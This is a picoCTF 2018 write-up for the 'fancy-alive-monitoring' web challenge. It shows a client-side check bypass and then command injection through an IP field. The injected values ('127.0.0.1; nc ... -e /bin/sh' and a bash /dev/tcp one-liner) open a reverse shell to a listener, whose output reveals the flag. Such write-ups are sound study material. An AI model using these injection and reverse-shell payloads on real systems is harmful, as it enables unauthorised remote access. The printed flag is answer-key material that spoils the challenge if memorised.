# fancy-alive-monitoring
Web Exploitation - 400 points

## Challenge 
> One of my school mate developed an alive monitoring tool. Can you get a flag from http://2018shell2.picoctf.com:56517 (link)?

## Hint
> This application uses the validation check both on the client side and on the server side, but the server check seems to be inappropriate.

> You should be able to listen through the shell on the server.


## Solution

The source is provided on the website: [index.txt](index.txt)

To bypass client-side check, call this in Javascript console to submit

	document.getElementById("monitor").submit();

The server-side check only checks for an IP address but still allows additional contents. So we can execute shell commands...

---

From the hint, we need to spawn a reverse shell

 - https://null-byte.wonderhowto.com/how-to/use-command-injection-pop-reverse-shell-web-server-0185760/
 - https://gist.github.com/rshipp/eee36684db07d234c1cc
 - https://hackernoon.com/reverse-shell-cf154dfee6bd
 - https://stackoverflow.com/questions/35271850/what-is-a-reverse-shell

Listen on our account shell using `nc -v -l -p 2718`

And then connect through the website by submitting any of the following:

	127.0.0.1; nc 2018shell2.picoctf.com 2718 -e /bin/sh
	127.0.0.1; /bin/bash -c 'bash -i >& /dev/tcp/2018shell2.picoctf.com/2718 0>&1'
	127.0.0.1; /bin/bash -c 'bash -i >& /dev/tcp/2018shell2.picoctf.com/2718 0>&1'

And afterwhich we can cat out the flag

	zst123@pico-2018-shell-2:~$ nc -v -l -p2718

	Listening on [0.0.0.0] (family 0, port 2718)
	Connection from [18.224.157.204] port 2718 [tcp/*] accepted (family 2, sport 44474)
	bash: cannot set terminal process group (121526): Inappropriate ioctl for device
	bash: no job control in this shell

	<ive-monitoring_2_d3275d52f5439e00b10d058c8f4d202f$ ls  
	ls
	index.php
	index.txt
	the-secret-1755-flag.txt
	xinet_startup.sh

	<ive-monitoring_2_d3275d52f5439e00b10d058c8f4d202f$ cat *flag.txt
	cat *flag.txt
	Here is your flag: picoCTF{n3v3r_trust_a_b0x_36d4a875}


## Flag

	picoCTF{n3v3r_trust_a_b0x_36d4a875}
